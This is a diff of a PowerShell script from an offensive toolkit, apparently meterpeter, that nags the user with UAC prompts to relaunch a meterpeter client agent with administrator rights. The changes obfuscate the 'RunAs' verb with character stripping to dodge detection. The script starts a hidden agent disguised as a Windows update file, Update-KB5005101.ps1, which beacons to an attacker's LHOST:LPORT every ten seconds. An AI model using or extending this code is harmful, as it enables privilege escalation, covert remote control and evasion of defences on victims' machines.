@@ -1,11 +1,11 @@
 ﻿<#
 .SYNOPSIS
-   UAC Auto-Elevate meterpeter client payload
+   UAC Auto-Elevate meterpeter client agent
 
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
-   Optional Dependencies: none
+   Optional Dependencies: netstat
    PS cmdlet Dev version: v1.0.3
 
 .DESCRIPTION
@@ -18,7 +18,7 @@
    it with admin privileges by sellecting 'NO' button in UAC prompt
    Warning: Parameter -attacker 'LHOST:LPORT' allows this cmdlet to
    check for agent conection [loop] or abort cmdlet execution if any
-   connection from server <-> client is found active (brake loop)
+   connection from server <-> client is found active (break loop)
 
 .Parameter Attacker
    Attacker LHOST:LPORT (default: off)
@@ -105,9 +105,10 @@ If($StartTime -Match '^(\d+\d+:+\d+\d)$')
 $Attacker = (Get-Content -Path "$Env:TMP\fddr.log"|Select-Object -First 1)
 If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
-  write-host "[*] Relaunch console as an elevated process .."
-  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
-  exit
+   $Namelless = "%R@unA@s%" -replace '(@|%)',''
+   write-host "[*] Relaunch console as an elevated process .."
+   Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $Namelless
+   exit
 }
 
 
@@ -119,7 +120,7 @@ If($Attacker -match '^(off)$')
       Helper - Execute agent WITHOUT confirm if connection has recived
    #>
 
-   write-host "[*] Executing meterpeter client [Admin:Simple]"
+   write-host "[*] Executing meterpeter client [Admin:Once]"
    Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\Update-KB5005101.ps1"   
 }
 Else
@@ -128,6 +129,11 @@ Else
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Execute agent and CONFIRM if connection has recived
+
+   .NOTES
+      Agent [Update-KB5005101.ps1] will beacon home from 10 to 10
+      seconds unless UACeop.ps1 its stoped or an active connection
+      its found from server <-> Client using netstat native command
    #>
 
    For(;;)
